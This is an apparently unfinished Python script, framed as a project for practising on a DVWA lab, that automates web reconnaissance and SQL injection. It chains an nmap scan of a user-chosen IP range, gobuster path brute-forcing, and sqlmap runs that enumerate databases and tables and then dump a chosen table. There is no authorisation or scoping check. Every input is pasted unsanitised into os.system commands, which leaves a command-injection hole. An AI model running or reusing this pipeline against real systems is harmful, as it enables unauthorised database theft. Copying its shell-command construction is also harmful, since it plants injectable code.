#!/usr/bin/env python

'''
The purpose of our tool is to automate web application reconnaissance and SQL Injection.
This tool will test if any hidden paths of the web application is vulnerable to SQL injection.
 Our proposed tool would
 1) ping the desired network range for live hosts,
 2) scan for ports 80, 443 for web servers,
 3) use Dirbuster to show any hidden files and directories,
 4) try to perform SQLMap on those hidden web pages if they contain forms or any kind of user input.


1.) Sqler [range]
    - Nmap the range and scan for ports 80, 443
    - Return a list of webservers
    - Ask which one you want to proceed
    - Input: “dvwa.com ip address”
    https://medium.com/@TheShredder/create-your-ethical-hacking-environment-install-dvwa-into-your-kali-linux-4783282dea6a
    https://www.yeahhub.com/install-dvwa-kali-linux/
2.) Use gobuster
    - Get the data back somehow?????
    - Run gobuster -o <file> – specify a file name to write the output to.
3.) Perform sqlmap on those paths in that output file from step 2
    - Login page
            -Use sqlmap on forms
    - Id parameter inside the url

CODE BELOW IS AN EXAMPLE OF A PAST PROJECT TO GIVE US STRUCTURE FOR UTILIZING
COMMAND LINE.
'''

import os
#import subprocess
#from time import sleep

if os.geteuid() != 0:
    print("\nYou must run this script as a root user.\n")

    # should delete following reponse/if statement later
    response = input("Continue anyway for script testing purposes? y/n ")
    if response != "y":
        exit(0)

def nmap_scan():
    ip_addr = input("Type in the IP range you would like to scan: ")
    cmd = "nmap -n --open " + ip_addr + " -p80,443"
    try:
        os.system(cmd)
        #we should probably parse nmap output to see if there were zero hosts that were found
        #if no hosts were found, give the option to run nmap scan again.

        #cmd = "ifconfig | grep mon | awk -F ':' '{print $1}' | awk '{print $1}'"
        #int_name = str(os.popen(cmd).read()).strip('\n')
        #return int_name
    except KeyboardInterrupt:
        print ("nmap scan failed. Run script again.")
    
    #ask user to input a website from the nmap command output. Maybe do a check to ensure that whatever they put was output from the nmap command?
    webserver = input("Webserver to attack: ")
    return webserver

def gobuster(webserver):
    #maybe os.mkdir for a new gobuster output folder to make it sexier?
    #create standard file for gobust output?
    #instead of hardcoding ask user to write path to pw cracking file?????
    cmd = "gobuster -o gobust.txt -u " + webserver + " -w /usr/share/wordlists/dirb/common.txt"
    try:
        os.system(cmd)
    except KeyboardInterrupt:
        print ("Gobuster failed. Run script again")

def inject_options_output():
    options = ["id parameter", "option page"]
    print("Which option would you like to use in SQLMap? Please type the corresponding type number\n")
    counter = 1
    for option in options:
        print(counter, option, "\n")
        counter += 1

def sqlmap(webserver):
    injection_options = ["?id=1", "NOT available"]
    hidden_path = input("What hidden path would you like to SQL inject? ")
    inject_options_output()
    option_chosen = int(input())
    base_cmd = "sqlmap -u " + webserver + hidden_path + injection_options[option_chosen - 1]
    cmd = base_cmd + " --dbs"
    try:
        os.system(cmd)
    except KeyboardInterrupt:
        print ("SQLMap failed. Run script again")
    return base_cmd

def database_search(base_cmd):
    database = input("What database would you like to attack? ")
    cmd = base_cmd + " -D " + database +  " --tables"
    try:
        os.system(cmd)
    except KeyboardInterrupt:
        print ("SQLMap - search for database failed. Run script again")
    return database

def table_dump(base_cmd, database):
    table = input("What table would you like to attack? ")
    cmd = base_cmd + " --dump -D " + database +  " -T " + table
    try:
        os.system(cmd)
    except KeyboardInterrupt:
        print ("SQLMap - search for database table failed. Run script again")

def intro():
    ascii_title =  "____   __   __       ___   __  \n/ ___) /  \ (  )     / __) /  \ \n\___ \(  O )/ (_/\  ( (_ \(  O )\n(____/ \__\)\____/   \___/ \__/      \n\n"
    print(ascii_title)
    response = input("Type 'help' for information, anything else to continue to application") 

def help():
    print("PRINT INFO ABOUT PROJECT HERE!!!!!")

def execute_sqlgo():
    webserver = nmap_scan() # should we clean up nmap output? put output in a seperate file? Give a warning to user when zero hosts are found?
    gobuster(webserver)
    base_cmd = sqlmap(webserver)
    database = database_search(base_cmd)
    table_dump(base_cmd, database)

if __name__ == "__main__":
     # ASCII art for tool name? Option to show user instructions and purpose of project?
    response = intro()
    if response == "help":
        help()
    else:
        execute_sqlgo()


